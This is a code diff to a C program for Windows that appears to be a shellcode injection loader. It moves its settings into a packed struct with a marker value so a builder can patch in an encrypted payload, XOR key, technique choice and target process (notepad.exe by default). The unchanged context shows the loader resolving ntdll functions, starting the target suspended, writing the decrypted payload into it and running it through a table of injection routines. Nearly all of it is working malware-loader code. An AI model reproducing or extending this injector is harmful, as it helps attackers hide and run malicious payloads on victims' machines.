@@ -2,23 +2,37 @@
 #include <winternl.h>
 
 #define PAYLOAD_MARKER 0xDEADBEEF
+#define MAX_PAYLOAD_SIZE 8192
+#define MAX_PROCESS_NAME 256
 
 typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 
-DWORD payload_size = PAYLOAD_MARKER;
-unsigned char payload[8192];
-unsigned char xor_key = 0;
-unsigned char technique = 0;
-char target_process[256] = "notepad.exe";
+#pragma pack(push, 1)
+typedef struct {
+	DWORD payload_size;
+	unsigned char payload[MAX_PAYLOAD_SIZE];
+	unsigned char xor_key;
+	unsigned char technique;
+	char target_process[MAX_PROCESS_NAME];
+} PatchData;
+#pragma pack(pop)
+
+PatchData patch_data = {
+	PAYLOAD_MARKER,
+	{0},
+	0,
+	0,
+	"notepad.exe"
+};
 
 void decrypt_payload() {
 	DWORD i;
-	if (xor_key != 0) {
-		for (i = 0; i < payload_size; i++) {
-			payload[i] ^= xor_key;
+	if (patch_data.xor_key != 0) {
+		for (i = 0; i < patch_data.payload_size; i++) {
+			patch_data.payload[i] ^= patch_data.xor_key;
 		}
 	}
 }
@@ -36,7 +50,7 @@ void inject_create_remote_thread() {
 	pNtProtectVirtualMemory NtProtectVirtualMemory;
 	pNtCreateThreadEx NtCreateThreadEx;
 
-	region_size = payload_size;
+	region_size = patch_data.payload_size;
 
 	hNtdll = GetModuleHandleA("ntdll.dll");
 	if (!hNtdll) {
@@ -52,7 +66,7 @@ void inject_create_remote_thread() {
 		return;
 	}
 
-	if (!CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+	if (!CreateProcessA(NULL, patch_data.target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
 		return;
 	}
 
@@ -63,7 +77,7 @@ void inject_create_remote_thread() {
 		return;
 	}
 
-	if (NtWriteVirtualMemory(pi.hProcess, buf, payload, payload_size, NULL) != 0) {
+	if (NtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
 		TerminateProcess(pi.hProcess, 0);
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
@@ -114,6 +128,6 @@ InjectionFunc injection_techniques[] = {
 
 int main() {
 	decrypt_payload();
-	injection_techniques[technique]();
+	injection_techniques[patch_data.technique]();
 	return 0;
 }
